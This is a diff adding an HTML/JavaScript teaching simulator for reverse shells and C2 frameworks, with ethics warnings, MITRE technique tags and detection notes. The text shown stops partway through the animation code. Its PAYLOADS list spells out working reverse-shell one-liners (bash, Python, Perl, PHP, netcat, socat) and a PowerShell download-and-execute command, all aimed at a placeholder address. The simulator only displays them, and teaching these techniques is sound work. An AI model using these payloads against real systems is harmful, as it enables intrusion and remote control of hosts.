@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reverse Shells &amp; C2 — Bind/Reverse/Meterpreter/Sliver Simulator</title>
+<style>
+  :root{
+    --bg-a:#0a0e1a; --bg-b:#05070d; --panel:#070a14; --border:#1e293b;
+    --green:#22c55e; --green-lt:#4ade80; --cyan:#22d3ee; --amber:#f59e0b;
+    --red:#ef4444; --purple:#a855f7; --blue:#3b82f6;
+    --text:#cbd5e1; --muted:#64748b;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;overflow:hidden}
+  body{
+    font-family:'Courier New',ui-monospace,Menlo,monospace;
+    background:linear-gradient(160deg,var(--bg-a),var(--bg-b));
+    color:var(--text); display:flex; flex-direction:column;
+  }
+  body::before{
+    content:""; position:fixed; inset:0; pointer-events:none; z-index:9999;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,.15) 0 1px,transparent 1px 3px);
+    opacity:.35;
+  }
+  header{
+    display:flex; justify-content:space-between; align-items:center;
+    padding:8px 16px; border-bottom:1px solid var(--border);
+    background:rgba(7,10,20,.85); z-index:10;
+  }
+  header h1{ font-size:15px; letter-spacing:2px; color:var(--purple);
+    text-shadow:0 0 8px rgba(168,85,247,.5); }
+  header .sub{ font-size:10px; color:var(--muted); letter-spacing:1px; }
+  .header-actions{ display:flex; gap:8px; }
+  .header-actions button{
+    font-family:inherit; font-size:10px; letter-spacing:1px;
+    background:#0b1220; border:1px solid var(--border); color:var(--text);
+    padding:5px 10px; border-radius:4px; cursor:pointer; transition:.15s;
+  }
+  .header-actions button:hover{ border-color:var(--purple); color:#d8b4fe; }
+  .header-actions button.active{
+    border-color:var(--purple); color:#d8b4fe;
+    box-shadow:0 0 10px rgba(168,85,247,.3);
+  }
+  .layout{ flex:1; display:flex; min-height:0; gap:1px; background:var(--border); }
+  .controls-pane{
+    width:340px; min-width:340px; background:var(--panel);
+    display:flex; flex-direction:column; overflow-y:auto; padding:10px; gap:10px;
+  }
+  .canvas-pane{ flex:1; position:relative; background:var(--panel); min-width:0; }
+  #stage{ display:block; width:100%; height:100%; }
+  .teaching-pane{
+    width:400px; min-width:400px; background:var(--panel);
+    display:flex; flex-direction:column; overflow:hidden;
+  }
+  .ctl-group{
+    border:1px solid var(--border); border-radius:5px;
+    background:#060912; padding:8px;
+  }
+  .ctl-group h3{
+    font-size:10px; letter-spacing:1.5px; color:var(--cyan);
+    margin-bottom:7px; text-transform:uppercase;
+  }
+  label.ctl-label{
+    display:block; font-size:10px; color:var(--muted); margin:6px 0 3px;
+  }
+  select,input[type=text],textarea{
+    width:100%; font-family:inherit; font-size:11px;
+    background:#0a0f1a; border:1px solid var(--border); color:var(--green-lt);
+    padding:5px 7px; border-radius:3px; outline:none;
+  }
+  select:focus,input:focus,textarea:focus{ border-color:var(--purple); }
+  textarea{ resize:vertical; min-height:52px; line-height:1.4; font-family:'Courier New',monospace; font-size:10px; }
+  input[type=range]{
+    width:100%; -webkit-appearance:none; height:4px; background:#1e293b;
+    border-radius:2px; outline:none; margin:2px 0;
+  }
+  input[type=range]::-webkit-slider-thumb{
+    -webkit-appearance:none; width:13px; height:13px; border-radius:50%;
+    background:var(--purple); cursor:pointer; box-shadow:0 0 7px rgba(168,85,247,.7);
+  }
+  input[type=range]::-moz-range-thumb{
+    width:13px; height:13px; border:none; border-radius:50%;
+    background:var(--purple); cursor:pointer;
+  }
+  .slider-row{ display:flex; justify-content:space-between; font-size:10px; color:var(--muted); }
+  .slider-val{ color:#d8b4fe; font-weight:bold; }
+  .btn-row{ display:flex; gap:6px; flex-wrap:wrap; margin-top:6px; }
+  button.act{
+    flex:1; min-width:70px; font-family:inherit; font-size:10px; letter-spacing:1px;
+    background:#0b1220; border:1px solid var(--border); color:var(--text);
+    padding:7px 6px; border-radius:4px; cursor:pointer; transition:.15s;
+    text-transform:uppercase;
+  }
+  button.act:hover{ border-color:var(--purple); color:#d8b4fe; }
+  button.act.primary{
+    background:linear-gradient(180deg,#1a0f2a,#0a0612);
+    border-color:var(--purple); color:#d8b4fe;
+    box-shadow:0 0 10px rgba(168,85,247,.25);
+  }
+  button.act.primary:hover{ box-shadow:0 0 16px rgba(168,85,247,.5); }
+  button.act.danger{ border-color:var(--red); color:#fca5a5; }
+  button.act.warn{ border-color:var(--amber); color:#fcd34d; }
+  button.act.ok{ border-color:var(--green); color:var(--green-lt); }
+  button.act.ok:hover{ background:#0f2a18; }
+  button.act.pulse{ animation:pulsePurp 1.4s infinite; }
+  @keyframes pulsePurp{
+    0%,100%{ box-shadow:0 0 6px rgba(168,85,247,.3); }
+    50%{ box-shadow:0 0 18px rgba(168,85,247,.8); }
+  }
+  .term{
+    background:#0a0f0a; border:1px solid #14321a; border-radius:4px;
+    padding:7px; font-size:10px; line-height:1.45; color:var(--green-lt);
+    height:150px; overflow-y:auto; white-space:pre-wrap; word-break:break-all;
+  }
+  .term::-webkit-scrollbar,.teaching-feed::-webkit-scrollbar,
+  .controls-pane::-webkit-scrollbar{ width:6px; }
+  .term::-webkit-scrollbar-thumb,.teaching-feed::-webkit-scrollbar-thumb,
+  .controls-pane::-webkit-scrollbar-thumb{ background:#1e293b; border-radius:3px; }
+  .term .prompt{ color:var(--green); }
+  .term .cursor{ display:inline-block; width:7px; height:12px; background:var(--green-lt);
+    animation:blink 1s step-end infinite; vertical-align:middle; }
+  @keyframes blink{ 50%{ opacity:0; } }
+  .metrics-grid{
+    display:grid; grid-template-columns:repeat(4,1fr); gap:5px;
+    padding:8px; border-bottom:1px solid var(--border);
+  }
+  .metric{
+    background:#060912; border:1px solid var(--border); border-radius:4px;
+    padding:5px 6px; text-align:center;
+  }
+  .metric .m-label{ font-size:8px; color:var(--muted); letter-spacing:.5px;
+    text-transform:uppercase; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+  .metric .m-value{ font-size:14px; font-weight:bold; color:var(--green-lt);
+    margin-top:2px; transition:color .2s; }
+  .metric.warn .m-value{ color:var(--amber); }
+  .metric.bad .m-value{ color:var(--red); }
+  .metric.purple .m-value{ color:#d8b4fe; }
+  .info-card{
+    padding:8px; border-bottom:1px solid var(--border); font-size:10px;
+    line-height:1.5; color:var(--muted);
+  }
+  .info-card b{ color:var(--cyan); }
+  .info-card .eq{ color:var(--green-lt); font-size:10px;
+    background:#060912; padding:3px 5px; border-radius:3px;
+    display:inline-block; margin:2px 0; }
+  .teaching-feed{
+    flex:1; overflow-y:auto; padding:6px 8px; display:flex;
+    flex-direction:column; gap:4px;
+  }
+  .feed-item{
+    font-size:10px; line-height:1.45; padding:5px 7px; border-radius:3px;
+    background:#060912; border-left:3px solid var(--blue);
+    animation:feedIn .25s ease-out; word-break:break-word;
+  }
+  @keyframes feedIn{ from{ opacity:0; transform:translateX(10px); } to{ opacity:1; transform:none; } }
+  .feed-item .tag{
+    font-size:8px; font-weight:bold; letter-spacing:1px;
+    padding:1px 5px; border-radius:2px; margin-right:5px; display:inline-block;
+  }
+  .feed-item.info{ border-left-color:var(--blue); }
+  .feed-item.info .tag{ background:rgba(59,130,246,.2); color:#93c5fd; }
+  .feed-item.ok{ border-left-color:var(--green); }
+  .feed-item.ok .tag{ background:rgba(34,197,94,.2); color:var(--green-lt); }
+  .feed-item.warn{ border-left-color:var(--amber); }
+  .feed-item.warn .tag{ background:rgba(245,158,11,.2); color:#fcd34d; }
+  .feed-item.error{ border-left-color:var(--red); }
+  .feed-item.error .tag{ background:rgba(239,68,68,.2); color:#fca5a5; }
+  .feed-item.concept{ border-left-color:var(--purple); }
+  .feed-item.concept .tag{ background:rgba(168,85,247,.2); color:#d8b4fe; }
+  .feed-item.ethics{ border-left-color:#fbbf24; background:#1a1506; }
+  .feed-item.ethics .tag{ background:rgba(251,191,36,.25); color:#fde68a; }
+  .feed-item.cmd{
+    border-left-color:var(--green); background:#0a0f0a; color:var(--green-lt);
+    font-family:'Courier New',monospace; white-space:pre-wrap;
+  }
+  .feed-item.cmd .tag{ background:rgba(34,197,94,.2); color:var(--green-lt); }
+  .ethics-banner{
+    position:absolute; top:8px; left:50%; transform:translateX(-50%);
+    background:rgba(120,53,15,.85); border:1px solid var(--amber);
+    color:#fde68a; font-size:9px; padding:4px 12px; border-radius:4px;
+    letter-spacing:.5px; z-index:5; white-space:nowrap;
+    box-shadow:0 0 14px rgba(245,158,11,.3);
+  }
+  .footer-overlay{
+    position:absolute; bottom:6px; left:50%; transform:translateX(-50%);
+    font-size:8px; color:var(--muted); letter-spacing:.5px; z-index:5; white-space:nowrap;
+  }
+  .status-badges{
+    position:absolute; top:38px; left:10px; z-index:5;
+    display:flex; flex-direction:column; gap:4px;
+  }
+  .status-badge{
+    font-size:9px; background:rgba(7,10,20,.85); border:1px solid var(--border);
+    padding:3px 8px; border-radius:3px; color:var(--muted); letter-spacing:.5px;
+  }
+  .status-badge b{ color:#d8b4fe; }
+  .status-badge.warn b{ color:var(--amber); }
+  .status-badge.bad b{ color:var(--red); }
+  .sh-chain{
+    position:absolute; bottom:26px; left:10px; right:10px; z-index:5;
+    display:flex; gap:3px;
+  }
+  .sh-phase{
+    flex:1; text-align:center; font-size:8px; letter-spacing:.5px;
+    padding:4px 2px; background:rgba(7,10,20,.8); border:1px solid var(--border);
+    border-radius:3px; color:var(--muted); transition:.2s;
+  }
+  .sh-phase.done{ border-color:var(--purple); color:#d8b4fe;
+    background:rgba(168,85,247,.12); }
+  .sh-phase.active{ border-color:var(--purple); color:#d8b4fe;
+    background:rgba(168,85,247,.2); box-shadow:0 0 10px rgba(168,85,247,.6);
+    animation:kcPurp 1.2s infinite; }
+  @keyframes kcPurp{ 50%{ box-shadow:0 0 16px rgba(168,85,247,.9); } }
+  .toast{
+    position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(60px);
+    background:#0b1220; border:1px solid var(--green); color:var(--green-lt);
+    padding:8px 18px; border-radius:4px; font-size:11px; letter-spacing:1px;
+    opacity:0; transition:.3s; z-index:10000; pointer-events:none;
+    box-shadow:0 0 20px rgba(34,197,94,.3);
+  }
+  .toast.show{ transform:translateX(-50%) translateY(0); opacity:1; }
+</style>
+</head>
+<body>
+<header>
+  <div>
+    <h1>REVERSE SHELLS &amp; C2</h1>
+    <span class="sub">BIND · REVERSE · METERPRETER · SLIVER · MITRE T1059/T1071</span>
+  </div>
+  <div class="header-actions">
+    <button class="teaching-toggle active" id="teachingToggle">📖 TEACHING: ON</button>
+    <button class="voice-toggle" id="voiceToggle">VOICE: OFF</button>
+  </div>
+</header>
+
+<div class="layout">
+  <aside class="controls-pane">
+    <div class="ctl-group">
+      <h3>◆ Shell Type</h3>
+      <select id="shellSelect">
+        <option value="bind">Bind shell (listener on target)</option>
+        <option value="reverse" selected>Reverse shell (target connects out)</option>
+        <option value="meterpreter">Meterpreter (in-memory, encrypted)</option>
+        <option value="sliver">Sliver C2 (mTLS, WireGuard)</option>
+        <option value="web">Web shell (PHP/ASPX/JSP)</option>
+        <option value="socat">Socat / Netcat encrypted</option>
+        <option value="powershell">PowerShell Empire / Starfighter</option>
+      </select>
+      <label class="ctl-label">Language / payload</label>
+      <select id="langSelect">
+        <option value="bash">bash -i</option>
+        <option value="python">Python socket</option>
+        <option value="perl">Perl</option>
+        <option value="php">PHP</option>
+        <option value="powershell">PowerShell</option>
+        <option value="nc">Netcat -e</option>
+        <option value="socat">Socat PTY</option>
+      </select>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Connection</h3>
+      <label class="ctl-label">C2 IP:Port</label>
+      <input type="text" id="c2Input" value="203.0.113.66:4444">
+      <label class="ctl-label">Protocol</label>
+      <select id="protoSelect">
+        <option value="tcp">Raw TCP</option>
+        <option value="tls">TLS (encrypted)</option>
+        <option value="https">HTTPS (malleable)</option>
+        <option value="dns">DNS tunneling</option>
+        <option value="icmp">ICMP (ping tunnel)</option>
+        <option value="mtls">mTLS + WireGuard</option>
+      </select>
+      <label class="ctl-label">Callback interval (s)</label>
+      <input type="text" id="intervalInput" value="60">
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Evasion</h3>
+      <label class="ctl-label">Obfuscation <span class="slider-val" id="obfVal">60%</span></label>
+      <input type="range" id="obfSlider" min="0" max="100" value="60">
+      <label class="ctl-label">Jitter (%) <span class="slider-val" id="jitVal">20%</span></label>
+      <input type="range" id="jitSlider" min="0" max="100" value="20">
+      <label class="ctl-label">Egress port</label>
+      <select id="portSelect">
+        <option value="443">443 (HTTPS)</option>
+        <option value="53">53 (DNS)</option>
+        <option value="80">80 (HTTP)</option>
+        <option value="8080">8080 (proxy)</option>
+        <option value="4444">4444 (default — noisy)</option>
+      </select>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Actions</h3>
+      <div class="btn-row">
+        <button type="button" class="act primary pulse" id="startBtn">▶ CONNECT</button>
+        <button type="button" class="act" id="stepBtn">⏭ STEP</button>
+        <button type="button" class="act danger" id="resetBtn">⟲ RESET</button>
+      </div>
+      <div class="btn-row">
+        <button type="button" class="act warn" id="detectBtn">🔍 DETECT</button>
+        <button type="button" class="act ok" id="killBtn">💀 KILL SHELL</button>
+      </div>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Terminal</h3>
+      <div class="term" id="terminal">
+        <span class="prompt">attacker@kali:~$ </span><span id="termContent"></span><span class="cursor"></span>
+      </div>
+    </div>
+  </aside>
+
+  <main class="canvas-pane">
+    <canvas id="stage"></canvas>
+    <div class="ethics-banner">⚠ FOR EDUCATIONAL USE ONLY — Reverse shells on unauthorized systems are federal crimes under CFAA/CMA.</div>
+    <div class="status-badges">
+      <div class="status-badge">SHELL: <b id="badgeShell">REVERSE</b></div>
+      <div class="status-badge">C2: <b id="badgeC2">203.0.113.66:4444</b></div>
+      <div class="status-badge">STATUS: <b id="badgeStatus">IDLE</b></div>
+      <div class="status-badge">DETECTED: <b id="badgeDetected">NO</b></div>
+    </div>
+    <div class="sh-chain" id="shChain">
+      <div class="sh-phase" id="shp-STAGE">STAGE</div>
+      <div class="sh-phase" id="shp-EXECUTE">EXECUTE</div>
+      <div class="sh-phase" id="shp-CALLBACK">CALLBACK</div>
+      <div class="sh-phase" id="shp-SHELL">SHELL</div>
+      <div class="sh-phase" id="shp-PERSIST">PERSIST</div>
+      <div class="sh-phase" id="shp-EXFIL">EXFIL</div>
+    </div>
+    <div class="footer-overlay">MITRE T1059 (Command Interpreter) · T1071 (Application Layer C2) · T1573 (Encrypted Channel)</div>
+  </main>
+
+  <aside class="teaching-pane">
+    <div class="metrics-grid">
+      <div class="metric purple" id="mShells"><div class="m-label">Shells</div><div class="m-value" id="mShellsVal">0</div></div>
+      <div class="metric" id="mSession"><div class="m-label">Session TTL</div><div class="m-value" id="mSessionVal">—</div></div>
+      <div class="metric" id="mBeacons"><div class="m-label">Beacons</div><div class="m-value" id="mBeaconsVal">0</div></div>
+      <div class="metric" id="mDetect"><div class="m-label">Detect Prob</div><div class="m-value" id="mDetectVal">0%</div></div>
+      <div class="metric" id="mData"><div class="m-label">Data Exfil</div><div class="m-value" id="mDataVal">0 MB</div></div>
+      <div class="metric" id="mJitter"><div class="m-label">Jitter</div><div class="m-value" id="mJitterVal">20%</div></div>
+      <div class="metric" id="mRisk"><div class="m-label">Risk</div><div class="m-value" id="mRiskVal">0</div></div>
+      <div class="metric" id="mDefense"><div class="m-label">Status</div><div class="m-value" id="mDefenseVal">OFF</div></div>
+    </div>
+    <div class="info-card">
+      <b>Reverse shells — target calls back to attacker.</b><br>
+      <span class="eq">Bind: target listens, attacker connects (blocked by NAT)</span><br>
+      <span class="eq">Reverse: target initiates outbound (bypasses NAT/firewall)</span><br>
+      <span class="eq">C2: beacon interval + jitter + encryption</span><br>
+      <span class="eq">Detection: JA3/JA3S, beacon analysis, process anomaly</span><br>
+      <span style="color:var(--purple)">MITRE T1059 · T1071 · T1573 · T1008 · T1095</span>
+    </div>
+    <div class="teaching-feed" id="teachingFeed"></div>
+  </aside>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+"use strict";
+
+var STATE = {
+  running:false,
+  shell:'reverse',
+  lang:'bash',
+  c2:'203.0.113.66:4444',
+  proto:'tcp',
+  interval:60,
+  obf:0.6,
+  jitter:0.2,
+  port:443,
+  shells:0,
+  sessionTTL:'—',
+  beacons:0,
+  detectProb:0,
+  dataExfil:0,
+  risk:0,
+  detected:false,
+  killed:false,
+  phaseIdx:0,
+  tick:0,
+  lastTime:0,
+  events:[],
+  nodes:[],
+  feedCount:0
+};
+
+var PHASES = ['STAGE','EXECUTE','CALLBACK','SHELL','PERSIST','EXFIL'];
+
+var SHELLS = {
+  bind:{
+    title:'Bind shell',
+    detail:'Target listens on a port (nc -lvp 4444 -e /bin/bash). Attacker connects. Problem: inbound firewall blocks. Rare in modern environments unless misconfigured.',
+    detectability:0.9,
+    port:'4444',
+    protocol:'TCP'
+  },
+  reverse:{
+    title:'Reverse shell',
+    detail:'Target connects OUT to attacker (bash -i >& /dev/tcp/attacker/port). Bypasses NAT + inbound firewall. Most common technique.',
+    detectability:0.5,
+    port:'4444',
+    protocol:'TCP'
+  },
+  meterpreter:{
+    title:'Meterpreter',
+    detail:'Metasploit in-memory payload. No files dropped. Encrypted channel. DLL injection into legitimate process. Very hard to detect without EDR memory scanning.',
+    detectability:0.3,
+    port:'4444',
+    protocol:'TLS'
+  },
+  sliver:{
+    title:'Sliver C2',
+    detail:'Modern C2 (Bishop Fox, 2020). Uses mTLS, WireGuard, HTTP/2. Multiplayer, scriptable, implant generation for all platforms. Beacon + session modes.',
+    detectability:0.25,
+    port:'8888',
+    protocol:'mTLS'
+  },
+  web:{
+    title:'Web shell',
+    detail:'PHP/ASPX/JSP file on webserver. Attacker sends commands via HTTP GET/POST parameters. Persists across reboots. Often found in older CMS deployments.',
+    detectability:0.6,
+    port:'80',
+    protocol:'HTTP'
+  },
+  socat:{
+    title:'Socat encrypted',
+    detail:'socat TCP-L:4444 EXEC:/bin/bash,pty,stderr with OpenSSL: socat OPENSSL-LISTEN:4444,cert=... Provides encrypted shell.',
+    detectability:0.4,
+    port:'4444',
+    protocol:'TLS'
+  },
+  powershell:{
+    title:'PowerShell Empire',
+    detail:'PowerShell-based C2. Runs entirely in memory via IEX (Invoke-Expression). Downloads stage from HTTP, decrypts, executes. Fileless.',
+    detectability:0.35,
+    port:'80',
+    protocol:'HTTPS'
+  }
+};
+
+var PAYLOADS = {
+  bash:"bash -i >& /dev/tcp/203.0.113.66/4444 0>&1",
+  python:"python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"203.0.113.66\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'",
+  perl:"perl -e 'use Socket; $i=\"203.0.113.66\"; $p=4444; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};'",
+  php:"php -r '$sock=fsockopen(\"203.0.113.66\",4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+  powershell:"powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.66/ps.ps1')\"",
+  nc:"nc -e /bin/bash 203.0.113.66 4444",
+  socat:"socat TCP:203.0.113.66:4444 EXEC:/bin/bash,pty,stderr"
+};
+
+var canvas = document.getElementById('stage');
+var ctx = canvas.getContext('2d');
+var terminalContent = document.getElementById('termContent');
+var teachingFeed = document.getElementById('teachingFeed');
+
+function resizeCanvas(){
+  var pane = canvas.parentElement;
+  canvas.width = pane.clientWidth;
+  canvas.height = pane.clientHeight;
+  buildTopology();
+}
+window.addEventListener('resize', resizeCanvas);
+
+function buildTopology(){
+  var W = canvas.width, H = canvas.height;
+  STATE.nodes = [
+    {id:'attacker', label:'attacker', ip:STATE.c2, x:0.10*W, y:0.30*H, icon:'attacker', color:'#ef4444', glow:0, blink:0},
+    {id:'firewall', label:'egress firewall', ip:'filter', x:0.35*W, y:0.30*H, icon:'firewall', color:'#22c55e', glow:0, blink:0},
+    {id:'target', label:'target host', ip:'10.0.0.50', x:0.60*W, y:0.30*H, icon:'server', color:'#3b82f6', glow:0, blink:0},
+    {id:'process', label:'payload process', ip:STATE.lang, x:0.60*W, y:0.60*H, icon:'laptop', color:'#a855f7', glow:0, blink:0},
+    {id:'siem', label:'SIEM/EDR', ip:'detection', x:0.85*W, y:0.30*H, icon:'server', color:'#22c55e', glow:0, blink:0},
+    {id:'proxy', label:'egress proxy', ip:'if present', x:0.85*W, y:0.60*H, icon:'server', color:'#fcd34d', glow:0, blink:0}
+  ];
+}
+
+function drawIcon(type, x, y, color, glow, blink, label, ip){
+  ctx.save();
+  ctx.translate(x, y);
+  if(glow > 0){
+    var g = ctx.createRadialGradient(0,0,2,0,0,42);
+    g.addColorStop(0, 'rgba(168,85,247,'+(glow*0.55)+')');
+    g.addColorStop(1, 'rgba(0,0,0,0)');
+    ctx.fillStyle = g;
+    ctx.beginPath(); ctx.arc(0,0,42,0,Math.PI*2); ctx.fill();
+  }
+  ctx.strokeStyle = color; ctx.fillStyle = color;
+  ctx.lineWidth = 1.4;
+  ctx.shadowColor = color; ctx.shadowBlur = glow > 0 ? 8 : 0;
+
+  switch(type){
+    case 'server': {
+      ctx.strokeRect(-11,-16,22,32);
+      for(var i=0;i<5;i++){
+        var yy = -14 + i*6;
+        ctx.strokeRect(-9,yy,18,4.5);
+        ctx.fillStyle = blink%2===0 ? '#22c55e' : '#166534';
+        ctx.beginPath(); ctx.arc(7,yy+2.2,1.3,0,Math.PI*2); ctx.fill();
+        ctx.fillStyle = color;
+      }
+      break;
+    }
+    case 'laptop': {
+      ctx.strokeRect(-14,-12,28,18);
+      ctx.fillStyle = 'rgba(59,130,246,.15)';
+      ctx.fillRect(-13,-11,26,16);
+      ctx.strokeStyle = '#93c5fd'; ctx.lineWidth = 0.7;
+      for(var j=0;j<3;j++){ ctx.beginPath(); ctx.moveTo(-10,-8+j*4); ctx.lineTo(8,-8+j*4); ctx.stroke(); }
+      ctx.strokeStyle = color; ctx.lineWidth = 1.4;
+      ctx.beginPath(); ctx.moveTo(-16,6); ctx.lineTo(16,6); ctx.lineTo(14,9); ctx.lineTo(-14,9); ctx.closePath(); ctx.stroke();
+      break;
+    }
+    case 'firewall': {
+      ctx.lineWidth = 1.2;
+      for(var row=0;row<3;row++){
+        var y2 = -10 + row*7;
+        var off = row%2===0 ? 0 : 5;
+        for(var col=0;col<4;col++) ctx.strokeRect(-16+col*9+off, y2, 8, 6);
+      }
+      ctx.fillStyle = '#22c55e';
+      ctx.beginPath();
+      ctx.moveTo(0,-4); ctx.quadraticCurveTo(4,0,0,5); ctx.quadraticCurveTo(-4,0,0,-4);
+      ctx.fill();
+      break;
+    }
+    case 'attacker': {
+      ctx.beginPath();
+      ctx.arc(0,-6,7,Math.PI,0);
+      ctx.lineTo(8,8); ctx.lineTo(-8,8); ctx.closePath();
+      ctx.fillStyle = 'rgba(239,68,68,.3)'; ctx.fill(); ctx.stroke();
+      ctx.fillStyle = '#ef4444';
+      ctx.beginPath(); ctx.arc(-2.5,-5,1.5,0,Math.PI*2); ctx.fill();
+      ctx.beginPath(); ctx.arc(2.5,-5,1.5,0,Math.PI*2); ctx.fill();
+      break;
+    }
+  }
+  ctx.restore();
+  ctx.save();
+  ctx.font = 'bold 9px "Courier New",monospace';
+  ctx.textAlign = 'center';
+  ctx.fillStyle = color;
+  ctx.fillText(label, x, y + 30);
+  ctx.font = '8px "Courier New",monospace';
+  ctx.fillStyle = '#64748b';
+  ctx.fillText(ip, x, y + 40);
+  ctx.restore();
+}
+
+function spawnPacket(fromId, toId, color, label, speed){
+  var from = STATE.nodes.find(function(n){return n.id===fromId;});
+  var to = STATE.nodes.find(function(n){return n.id===toId;});
+  if(!from || !to) return;
+  STATE.events.push({type:'packet', from:{x:from.x,y:from.y}, to:{x:to.x,y:to.y},
+    t:0, speed:speed||0.02, color:color, label:label, size:5});
+}
+
+function escapeHtml(s){
+  return String(s)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;')
+    .replace(/'/g,'&#39;');
+}
+
+function addFeed(tag, text, type){
+  type = type || 'info';
+  var div = document.createElement('div');
+  div.className = 'feed-item ' + type;
+  var time = new Date().toLocaleTimeString('en-US',{hour12:false});
+  div.innerHTML = '<span class="tag">' + escapeHtml(tag) + '</span> ' +
+    '<span style="color:#475569">[' + time + ']</span> ' + escapeHtml(text);
+  teachingFeed.insertBefore(div, teachingFeed.firstChild);
+  STATE.feedCount++;
+  while(teachingFeed.children.length > 75) teachingFeed.removeChild(teachingFeed.lastChild);
+  speak(text);
+}
+function addCommandFeed(cmd, output){
+  var div = document.createElement('div');
+  div.className = 'feed-item cmd';
+  div.innerHTML = '<span class="tag">CMD</span><br>' +
+    '<span style="color:#4ade80">attacker@kali:~$ </span>' +
+    escapeHtml(cmd) + '\n' + escapeHtml(output);
+  teachingFeed.insertBefore(div, teachingFeed.firstChild);
+  while(teachingFeed.children.length > 75) teachingFeed.removeChild(teachingFeed.lastChild);
+}
+
+var termQueue = []; var termTyping = false;
+function termWrite(text, callback){
+  termQueue.push({text:text, callback:callback});
+  if(!termTyping) processTermQueue();
+}
+function processTermQueue(){
+  if(termQueue.length === 0){ termTyping = false; return; }
+  termTyping = true;
+  const item = termQueue.shift();
+  let i = 0; const text = item.text;
+  terminalContent.textContent = '';
+  const interval = setInterval(function(){
+    if(i < text.length){ terminalContent.textContent += text[i]; i++; }
+    else { clearInterval(interval); termTyping = false; if(item.callback) item.callback(); setTimeout(processTermQueue, 100); }
+  }, 10);
+}
+
+var VOICE = { enabled:false, queue:[], lastSpoken:{}, speaking:false, synth:window.speechSynthesis };
+function speak(text){
+  if(!VOICE.enabled || !VOICE.synth) return;
+  const now = Date.now();
+  if(VOICE.lastSpoken[text] && now - VOICE.lastSpoken[text] < 4000) return;
+  VOICE.lastSpoken[text] = now;
+  if(VOICE.queue.length >= 4) VOICE.queue.shift();
+  VOICE.queue.push(text);
+  if(!VOICE.speaking) processVoiceQueue();
+}
+function processVoiceQueue(){
+  if(VOICE.queue.length === 0){ VOICE.speaking = false; return; }
+  VOICE.speaking = true;
+  const text = VOICE.queue.shift();
+  const utter = new SpeechSynthesisUtterance(text);
+  utter.rate = 1.05; utter.pitch = 1.0;
+  const voices = VOICE.synth.getVoices();
+  const pref = voices.find(v => v.lang && v.lang.startsWith('en-US')) || voices[0];
+  if(pref) utter.voice = pref;
+  utter.onend = function(){ VOICE.speaking = false; setTimeout(processVoiceQueue, 120); };
+  utter.onerror = function(){ VOICE.speaking = false; setTimeout(processVoiceQueue, 120); };
+  VOICE.synth.speak(utter);
+}
+
+function boot(){
+  resizeCanvas();
+  addFeed('ETHICS',
+    'Reverse shells are the operational core of offensive security. They are ILLEGAL to deploy on systems you do not own or lack written authorization to test. Legal use cases: (1) Your own lab (VMs, containers). (2) Authorized penetration test with signed scope. (3) Red team engagement with rules of engagement. (4) CTF competitions. NEVER: real victims, production without consent, shared infrastructure. Defensively, understanding reverse shells helps you detect them: unusual outbound connections, encoded commands, process anomalies, beacon patterns. Reporting: if you find a live shell in a client environment, DOCUMENT (pcap, process tree, command history), then contain via EDR isolation — do NOT kill it first, or you lose evidence.',
+    'ethics');
+  setTimeout(function(){
+    addFeed('CONCEPT',
+      'A reverse shell has the target initiate an outbound connection to the attacker, bypassing inbound firewall rules and NAT. Contrast with a bind shell (target listens, attacker connects) which is often blocked. Modern C2 frameworks (Cobalt Strike, Sliver, Havoc, Mythic) use sleep + jitter to blend beacon traffic with legitimate patterns. Encryption (TLS, mTLS, WireGuard) defeats payload inspection. Meterpreter runs in memory with no disk artifacts. Fileless PowerShell loads stage directly into memory. Detection requires: network behavioral analysis (JA3/JA3S, beacon interval detection), endpoint detection (process anomaly, in-memory scanning), and egress filtering. MITRE T1059 (Command Interpreter), T1071 (Application Layer C2), T1573 (Encrypted Channel), T1008 (Fallback Channels).',
+      'concept');
+  }, 800);
+  setTimeout(function(){
+    termWrite('nc -lvnp 4444\nlistening on [any] 4444 ...\n\n# Target executes:\n' + PAYLOADS[STATE.lang] + '\n\nconnect to [203.0.113.66] from (UNKNOWN) [10.0.0.50] 51234\nbash: cannot set terminal process group (1234): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@target:/var/www$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)');
+  }, 1600);
+  setTimeout(function(){
+    addFeed('INFO',
+      'Shell: ' + SHELLS[STATE.shell].title + '. Language: ' + STATE.lang.toUpperCase() + '. C2: ' + STATE.c2 + ' over ' + STATE.proto.toUpperCase() + '. Click CONNECT to begin.',
+      'info');
+    updateBadges();
+  }, 2400);
+  requestAnimationFrame(loop);
+}
+
+function loop(ts){
+  const dt = STATE.lastTime ? (ts - STATE.lastTime) : 16;
+  STATE.lastTime = ts;
+  STATE.tick++;
+  STATE.nodes.forEach(n => { n.blink = Math.floor(STATE.tick / 20); });
+
+  for(let i = STATE.events.length - 1; i >= 0; i--){
+    const e = STATE.events[i];
+    if(e.type === 'packet'){
+      e.t += e.speed * (dt/16);
+      if(e.t >= 1) STATE.events.splice(i,1);
+    }
+  }
+  STATE.nodes.forEach(n => { if(n.glow > 0) n.glow -= 0.008 * (dt/16); if(n.glow < 0) n.glow = 0; });
+
+  if(STATE.running && STATE.tick % 30 === 0){
+    spawnPacket('target','attacker','#a855f7','BEACON',0.03);
